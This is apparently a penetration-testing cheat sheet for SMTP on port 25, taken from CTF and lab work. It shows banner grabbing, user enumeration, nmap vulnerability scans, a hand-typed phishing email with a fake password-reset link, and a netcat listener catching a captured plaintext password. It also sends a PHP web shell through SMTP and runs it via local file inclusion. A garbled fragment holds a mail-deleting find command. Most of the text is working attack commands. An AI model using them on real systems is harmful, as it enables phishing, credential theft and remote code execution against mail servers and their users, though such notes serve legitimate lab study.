# Port 25 - SMTP

### Connection and Banner Grabbing

```
telnet 10.11.1.217 25
nc -nv 10.11.1.217 25

>VRFY root
252 2.0.0 root
```

### Enumeration

{% code overflow="wrap" %}
```bash
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln* -p 25 192.168.174.42

# Enumerate usernames
nmap --script smtp-enum-users.nse 10.11.1.115

# Enumerate vulnerabilities
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $ip

```
{% endcode %}

### Send Email Commands

{% code overflow="wrap" %}
```bash
# This illustrates an example of sending email where hopefully a user will click the link, and connect back to the Kali by inserting an URL in the email. Completely CTFish example... 

nc -nv 192.168.157.137 25
#(UNKNOWN) [192.168.157.137] 25 (smtp) open
#220 postfish.off ESMTP Postfix (Ubuntu)
>HELO postfish
#250 postfish.off
>MAIL FROM: it@postfish.off
#250 2.1.0 Ok
>RCPT TO: brian.moore@postfish.off
#250 2.1.5 Ok
>DATA
354 End data with <CR><LF>.<CR><LF>
>Hi Brian,
>Please reset your password at http://192.168.49.157/
>Regards,
>IT
>.
#250 2.0.0 Ok: queued as C7FD0458F8
QUIT
#221 2.0.0 Bye

# wait for a few minutes to connect
sudo nc -nlvp 80
# You will recieve some connection back below.
# first_name%3DBrian%26last_name%3DMoore%26email%3Dbrian.moore%postfish.off%26username%3Dbrian.moore%26password%3DEternaLSunshinE%26confifind /var/mail/ -type f ! -name sales -delete_password%3DEternaLSunshinE

```
{% endcode %}

### LFI to SMTP(25) RCE

{% code overflow="wrap" %}
```bash
nc 192.168.142.212 25
# 220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
mail from: <iptracej>
# 250 2.1.0 Ok
rcpt to: helios
# 250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET['c']); ?>
.
# 250 2.0.0 Ok: queued as 6F185408A6
quit
# 221 2.0.0 Bye

curl http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&c=pwd
```
{% endcode %}

